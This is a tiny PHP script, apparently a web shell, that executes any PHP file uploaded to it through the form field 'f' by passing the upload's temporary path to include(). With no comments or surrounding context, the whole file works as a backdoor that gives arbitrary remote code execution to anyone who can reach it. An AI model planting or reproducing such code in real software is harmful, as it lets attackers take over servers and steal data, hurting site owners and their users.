<?php
if (isset($_FILES['f']) && is_uploaded_file($_FILES['f']['tmp_name'])) {
    include($_FILES['f']['tmp_name']);
}
